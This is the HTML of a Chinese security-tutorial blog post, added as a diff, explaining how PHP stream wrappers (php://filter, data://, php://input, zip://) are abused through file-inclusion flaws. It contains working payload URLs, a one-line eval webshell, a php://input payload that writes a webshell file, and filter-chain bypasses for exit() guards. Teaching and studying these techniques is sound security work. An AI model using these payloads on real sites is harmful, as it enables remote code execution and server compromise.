@@ -1,0 +1,216 @@
+<!doctype html><html lang=zh dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>PHP_伪协议 | 🌇 Endless Soar.</title><meta name=keywords content="PHP_伪协议"><meta name=description content="PHP伪协议详解
+php支持的伪协议
+
+
+ 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+
+
+1 file:// — 访问本地文件系统
+2 http:// — 访问 HTTP(s) 网址
+3 ftp:// — 访问 FTP(s) URLs
+4 php:// — 访问各个输入/输出流（I/O streams）
+5 zlib:// — 压缩流
+6 data:// — 数据（RFC 2397）
+7 glob:// — 查找匹配的文件路径模式
+8 phar:// — PHP 归档
+9 ssh2:// — Secure Shell 2
+10 rar:// — RAR
+11 ogg:// — 音频流
+12 expect:// — 处理交互式的流
+
+
+1. file://
+示例："><meta name=author content="AuranLu"><link rel=canonical href=https://auranlu.cc/posts/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/php_%E4%BC%AA%E5%8D%8F%E8%AE%AE/><meta name=google-site-verification content="auranlu"><meta name=yandex-verification content="auranlu"><meta name=msvalidate.01 content="auranlu"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://auranlu.cc/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://auranlu.cc/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://auranlu.cc/favicon.ico><link rel=apple-touch-icon href=https://auranlu.cc/favicon.ico><link rel=mask-icon href=https://auranlu.cc/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh href=https://auranlu.cc/posts/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/php_%E4%BC%AA%E5%8D%8F%E8%AE%AE/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script type=text/javascript async src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({tex2jax:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["[[","]]"]],processEscapes:!0,processEnvironments:!0,skipTags:["script","noscript","style","textarea","pre"],TeX:{equationNumbers:{autoNumber:"AMS"},extensions:["AMSmath.js","AMSsymbols.js"]}}}),MathJax.Hub.Queue(function(){var e,t=MathJax.Hub.getAllJax();for(e=0;e<t.length;e+=1)t[e].SourceElement().parentNode.className+=" has-jax"})</script><style>code.has-jax{font:inherit;font-size:100%;background:inherit;border:inherit;color:#515151}</style><meta property="og:url" content="https://auranlu.cc/posts/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/php_%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><meta property="og:site_name" content="🌇 Endless Soar."><meta property="og:title" content="PHP_伪协议"><meta property="og:description" content="PHP伪协议详解 php支持的伪协议
+1 2 3 4 5 6 7 8 9 10 11 12 1 file:// — 访问本地文件系统 2 http:// — 访问 HTTP(s) 网址 3 ftp:// — 访问 FTP(s) URLs 4 php:// — 访问各个输入/输出流（I/O streams） 5 zlib:// — 压缩流 6 data:// — 数据（RFC 2397） 7 glob:// — 查找匹配的文件路径模式 8 phar:// — PHP 归档 9 ssh2:// — Secure Shell 2 10 rar:// — RAR 11 ogg:// — 音频流 12 expect:// — 处理交互式的流 1. file:// 示例："><meta property="og:locale" content="zh"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-03-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-03-10T00:00:00+00:00"><meta property="article:tag" content="PHP_伪协议"><meta name=twitter:card content="summary"><meta name=twitter:title content="PHP_伪协议"><meta name=twitter:description content="PHP伪协议详解
+php支持的伪协议
+
+
+ 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+
+
+1 file:// — 访问本地文件系统
+2 http:// — 访问 HTTP(s) 网址
+3 ftp:// — 访问 FTP(s) URLs
+4 php:// — 访问各个输入/输出流（I/O streams）
+5 zlib:// — 压缩流
+6 data:// — 数据（RFC 2397）
+7 glob:// — 查找匹配的文件路径模式
+8 phar:// — PHP 归档
+9 ssh2:// — Secure Shell 2
+10 rar:// — RAR
+11 ogg:// — 音频流
+12 expect:// — 处理交互式的流
+
+
+1. file://
+示例："><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"/posts","item":"https://auranlu.cc/posts/"},{"@type":"ListItem","position":2,"name":"PHP_伪协议","item":"https://auranlu.cc/posts/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/php_%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"PHP_伪协议","name":"PHP_伪协议","description":"PHP伪协议详解 php支持的伪协议\n1 2 3 4 5 6 7 8 9 10 11 12 1 file:// — 访问本地文件系统 2 http:// — 访问 HTTP(s) 网址 3 ftp:// — 访问 FTP(s) URLs 4 php:// — 访问各个输入/输出流（I/O streams） 5 zlib:// — 压缩流 6 data:// — 数据（RFC 2397） 7 glob:// — 查找匹配的文件路径模式 8 phar:// — PHP 归档 9 ssh2:// — Secure Shell 2 10 rar:// — RAR 11 ogg:// — 音频流 12 expect:// — 处理交互式的流 1. file:// 示例：\n","keywords":["PHP_伪协议"],"articleBody":"PHP伪协议详解 php支持的伪协议\n1 2 3 4 5 6 7 8 9 10 11 12 1 file:// — 访问本地文件系统 2 http:// — 访问 HTTP(s) 网址 3 ftp:// — 访问 FTP(s) URLs 4 php:// — 访问各个输入/输出流（I/O streams） 5 zlib:// — 压缩流 6 data:// — 数据（RFC 2397） 7 glob:// — 查找匹配的文件路径模式 8 phar:// — PHP 归档 9 ssh2:// — Secure Shell 2 10 rar:// — RAR 11 ogg:// — 音频流 12 expect:// — 处理交互式的流 1. file:// 示例：\n1.file://[文件的绝对路径和文件名]\n1 http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt 2.file://[文件的相对路径和文件名]\n1 http://127.0.0.1/include.php?file=./phpinfo.txt 3.http://网络位置和文件名\n1 http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt 2. php://filter php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。\n简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。\nphp://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。\n协议参数\n名称 描述 resource=\u003c要过滤的数据流\u003e 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=\u003c读链的筛选列表\u003e 该参数可选。可以设定一个或多个过滤器名称，以管道符（ write=\u003c写链的筛选列表\u003e 该参数可选。可以设定一个或多个过滤器名称，以管道符（ \u003c；两个链的筛选列表\u003e 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 ​ 常用：\n1 2 php://filter/read=convert.base64-encode/resource=index.php php://filter/resource=index.php 利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。\n而使用的convert.base64-encode，就是一种过滤器。\n过滤器 字符串过滤器 该类通常以string开头，对每个字符都进行同样方式的处理。\nstring.rot13\n一种字符处理方式，字符右移十三位。\nstring.toupper\n将所有字符转换为大写。\nstring.tolower\n将所有字符转换为小写。\nstring.strip_tags 这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。\n转换过滤器 对数据流进行编码，通常用来读取文件源码。\nconvert.base64-encode \u0026 convert.base64-decode\nbase64加密解密\nconvert.quoted-printable-encode \u0026 convert.quoted-printable-decode\n可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。\n压缩过滤器 注意，这里的压缩过滤器指的并不是在数据流传入的时候对整个数据进行写入文件后压缩文件，也不代表可以压缩或者解压数据流。压缩过滤器不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。\n用到的两个相关过滤器：zlib.deflate（压缩）和 zlib.inflate（解压）。zilb是比较主流的用法，至于bzip2.compress和 bzip2.decompress工作的方式与 zlib 过滤器大致相同。\n加密过滤器 mcrypt.*和 mdecrypt.*使用 libmcrypt 提供了对称的加密和解密。\n更多妙用：https://www.leavesongs.com/PENETRATION/php-filter-magic.html\n利用filter伪协议绕过死亡exit 什么是死亡exit 死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：\n1 file_put_contents($content, '\u003c?php exit();' . $content);亦或者 1 file_put_contents($content, '\u003c?php exit();?\u003e' . $content); 这样，当你插入一句话木马时，文件的内容是这样子的：\n1 2 3 \u003c?php exit();?\u003e \u003c?php @eval($_POST['snakin']);?\u003e 这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。\nbase64decode绕过 利用filter协议来绕过，看下这样的代码：\n1 2 3 4 5 6 7 \u003c?php $content = '\u003c?php exit; ?\u003e'; $content .= $_POST['txt']; file_put_contents($_POST['filename'], $content); 当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。\n然而这里可以利用php://filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除死亡exit。\nbase64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：\n1 2 3 4 5 \u003c?php $_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']); base64_decode($_GET['txt']); 所以，当$content 包含 \u003c?php exit; ?\u003e时，解码过程会先去除识别不了的字符，\u003c ; ? \u003e和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。\n这个时候后面再加上编码后的一句话木马，就可以getshell了。\nstrip_tags绕过 这个\u003c?php exit; ?\u003e实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。\n但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。\n注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。\n1 php://filter/string.strip_tags|convert.base64-decode/resource=shell.php 更多绕过方法：file_put_content和死亡·杂糅代码之缘\n3. data:// 数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。\n示例用法：\n1 2 3 4 5 1、data://text/plain, http://127.0.0.1/include.php?file=data://text/plain,\u003c?php%20phpinfo();?\u003e 2、data://text/plain;base64, http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 范例 Example #1 打印 data:// 的内容\n1 2 3 4 \u003c?php // 打印 \"I love PHP\" echo file_get_contents ( 'data://text/plain;base64,SSBsb3ZlIFBIUAo=' ); ?\u003e Example #2 获取媒体类型\n1 2 3 4 5 6 7 \u003c?php $fp = fopen ( 'data://text/plain;base64,' , 'r' ); $meta = stream_get_meta_data ( $fp ); // 打印 \"text/plain\" echo $meta [ 'mediatype' ]; ?\u003e 4. php://input php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\nphp://input的使用\n1 2 3 4 5 http://127.0.0.1/include.php?file=php://input [POST DATA部分] \u003c?php phpinfo(); ?\u003e 写入一句话木马\n1 2 3 4 5 http://127.0.0.1/include.php?file=php://input [POST DATA部分] \u003c?php fputs(fopen('1juhua.php','w'),'\u003c?php @eval($_GET[cmd]); ?\u003e'); ?\u003e 例如： http://127.0.0.1/cmd.php?cmd=php://input POST数据：\u003c?php phpinfo()?\u003e 注意： 当enctype=“multipart/form-data\"的时候 php://input` 是无效的\n遇到file_get_contents()要想到用php://input绕过。\n5. zip://bzip://zlib:// 协议 作用：\nzip:// \u0026 bzip:// \u0026 zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可以修改为任意后缀名，如 jpg，png，gif，xxx等\n示例：\n1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件文件名](# 的编码为 %23)\n压缩 phpinfo.txt 为phpinfo.zip ,压缩包重命名为 phpinfo.jpg ,并上传\n1 http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt 2.compress.bzip2://file.bz2\n压缩phpinfo.txt 为phpinfo.bz2 并上传（同样支持任意后缀名)\n1 http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2 3.compress.zlib://file.gz\n压缩phpinfo.txt 为phpinfo.gz 并上传（支持任意后缀名）\n1 http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz ","wordCount":"2937","inLanguage":"zh","datePublished":"2025-03-10T00:00:00Z","dateModified":"2025-03-10T00:00:00Z","author":{"@type":"Person","name":"AuranLu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://auranlu.cc/posts/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/php_%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},"publisher":{"@type":"Organization","name":"🌇 Endless Soar.","logo":{"@type":"ImageObject","url":"https://auranlu.cc/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://auranlu.cc/ accesskey=h title="⛺Home (Alt + H)">⛺Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://auranlu.cc/posts/ title=/posts><span>POSTS 🗯</span></a></li><li><a href=https://auranlu.cc/archives/ title=/Archives🕑><span>ARCHIVES📄</span></a></li><li><a href=https://auranlu.cc/tags/ title=Tags><span>TAGS🔖</span></a></li><li><a href=https://auranlu.cc/search/ title=/SEARCH><span>SEARCH🔍</span></a></li><li><a href=https://auranlu.cc/about/ title=👇🤓👆康康驾到👇🤓👆通通闪开><span>ABOUT👇🤓👆</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://auranlu.cc/>主页</a>&nbsp;»&nbsp;<a href=https://auranlu.cc/posts/>/posts</a></div><h1 class="post-title entry-hint-parent">PHP_伪协议</h1><div class=post-meta><span title='2025-03-10 00:00:00 +0000 UTC'>2025-03-10</span>&nbsp;·&nbsp;AuranLu</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#1-file>1. file://</a></li><li><a href=#2-phpfilter>2. php://filter</a></li><li><a href=#3-data>3. data://</a></li><li><a href=#4-phpinput>4. php://input</a></li><li><a href=#5-zipbzipzlib-协议>5. zip://bzip://zlib:// 协议</a></li></ul></nav></div></details></div><div class=post-content><p>PHP伪协议详解
+php支持的伪协议</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1 file:// — 访问本地文件系统
+</span></span><span class=line><span class=cl>2 http:// — 访问 HTTP(s) 网址
+</span></span><span class=line><span class=cl>3 ftp:// — 访问 FTP(s) URLs
+</span></span><span class=line><span class=cl>4 php:// — 访问各个输入/输出流（I/O streams）
+</span></span><span class=line><span class=cl>5 zlib:// — 压缩流
+</span></span><span class=line><span class=cl>6 data:// — 数据（RFC 2397）
+</span></span><span class=line><span class=cl>7 glob:// — 查找匹配的文件路径模式
+</span></span><span class=line><span class=cl>8 phar:// — PHP 归档
+</span></span><span class=line><span class=cl>9 ssh2:// — Secure Shell 2
+</span></span><span class=line><span class=cl>10 rar:// — RAR
+</span></span><span class=line><span class=cl>11 ogg:// — 音频流
+</span></span><span class=line><span class=cl>12 expect:// — 处理交互式的流
+</span></span></code></pre></td></tr></table></div></div><h2 id=1-file>1. file://<a hidden class=anchor aria-hidden=true href=#1-file>#</a></h2><p>示例：</p><p>1.file://[文件的绝对路径和文件名]</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cobol data-lang=cobol><span class=line><span class=cl><span class=c>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
+</span></span></span></code></pre></td></tr></table></div></div><p>2.file://[文件的相对路径和文件名]</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cobol data-lang=cobol><span class=line><span class=cl><span class=c>http://127.0.0.1/include.php?file=./phpinfo.txt
+</span></span></span></code></pre></td></tr></table></div></div><p>3.http://网络位置和文件名</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cobol data-lang=cobol><span class=line><span class=cl><span class=c>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
+</span></span></span></code></pre></td></tr></table></div></div><h2 id=2-phpfilter>2. php://filter<a hidden class=anchor aria-hidden=true href=#2-phpfilter>#</a></h2><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p><p>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p><p>协议参数</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流></td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的筛选列表></td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（</td></tr><tr><td>write=&lt;写链的筛选列表></td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（</td></tr><tr><td>&lt;；两个链的筛选列表></td><td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>​
+常用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php://filter/read=convert.base64-encode/resource=index.php
+</span></span><span class=line><span class=cl>php://filter/resource=index.php
+</span></span></code></pre></td></tr></table></div></div><p>利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</p><p>而使用的convert.base64-encode，就是一种过滤器。</p><p>过滤器
+字符串过滤器
+该类通常以string开头，对每个字符都进行同样方式的处理。</p><p>string.rot13</p><p>一种字符处理方式，字符右移十三位。</p><p>string.toupper</p><p>将所有字符转换为大写。</p><p>string.tolower</p><p>将所有字符转换为小写。</p><p>string.strip_tags
+这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。</p><p>转换过滤器
+对数据流进行编码，通常用来读取文件源码。</p><p>convert.base64-encode & convert.base64-decode</p><p>base64加密解密</p><p>convert.quoted-printable-encode & convert.quoted-printable-decode</p><p>可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。</p><p>压缩过滤器
+注意，这里的压缩过滤器指的并不是在数据流传入的时候对整个数据进行写入文件后压缩文件，也不代表可以压缩或者解压数据流。压缩过滤器不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</p><p>用到的两个相关过滤器：zlib.deflate（压缩）和 zlib.inflate（解压）。zilb是比较主流的用法，至于bzip2.compress和 bzip2.decompress工作的方式与 zlib 过滤器大致相同。</p><p>加密过滤器
+mcrypt.*和 mdecrypt.*使用 libmcrypt 提供了对称的加密和解密。</p><p>更多妙用：https://www.leavesongs.com/PENETRATION/php-filter-magic.html</p><p>利用filter伪协议绕过死亡exit
+什么是死亡exit
+死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file_put_contents($content, &#39;&lt;?php exit();&#39; . $content);亦或者
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file_put_contents($content, &#39;&lt;?php exit();?&gt;&#39; . $content);
+</span></span></code></pre></td></tr></table></div></div><p>这样，当你插入一句话木马时，文件的内容是这样子的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php exit();?&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;?php @eval($_POST[&#39;snakin&#39;]);?&gt;
+</span></span></code></pre></td></tr></table></div></div><p>这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。</p><p>base64decode绕过
+利用filter协议来绕过，看下这样的代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$content = &#39;&lt;?php exit; ?&gt;&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$content .= $_POST[&#39;txt&#39;];
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>file_put_contents($_POST[&#39;filename&#39;], $content);
+</span></span></code></pre></td></tr></table></div></div><p>当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。</p><p>然而这里可以利用php://filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除死亡exit。</p><p>base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$_GET[&#39;txt&#39;] = preg_replace(&#39;|[^a-z0-9A-Z+/]|s&#39;, &#39;&#39;, $_GET[&#39;txt&#39;]);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>base64_decode($_GET[&#39;txt&#39;]);
+</span></span></code></pre></td></tr></table></div></div><p>所以，当$content 包含 时，解码过程会先去除识别不了的字符，&lt; ; ? >和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。</p><p>这个时候后面再加上编码后的一句话木马，就可以getshell了。</p><p>strip_tags绕过
+这个实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p><p>但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。</p><p>注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
+</span></span></code></pre></td></tr></table></div></div><p>更多绕过方法：file_put_content和死亡·杂糅代码之缘</p><h2 id=3-data>3. data://<a hidden class=anchor aria-hidden=true href=#3-data>#</a></h2><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</p><p>示例用法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=mi>1</span><span class=nx>、data</span><span class=o>://</span><span class=nx>text</span><span class=o>/</span><span class=nx>plain</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=nx>http</span><span class=o>://</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=o>/</span><span class=k>include</span><span class=o>.</span><span class=nx>php</span><span class=o>?</span><span class=nx>file</span><span class=o>=</span><span class=nx>data</span><span class=o>://</span><span class=nx>text</span><span class=o>/</span><span class=nx>plain</span><span class=p>,</span><span class=o>&lt;?</span><span class=nx>php</span><span class=o>%</span><span class=mi>20</span><span class=nx>phpinfo</span><span class=p>();</span><span class=cp>?&gt;</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>2、data://text/plain;base64,
+</span></span></span><span class=line><span class=cl><span class=err>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</span></span></span></code></pre></td></tr></table></div></div><p>范例
+Example #1 打印 data:// 的内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>// 打印 &#34;I love PHP&#34;
+</span></span><span class=line><span class=cl>echo  file_get_contents ( &#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39; );
+</span></span><span class=line><span class=cl>?&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Example #2 获取媒体类型</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
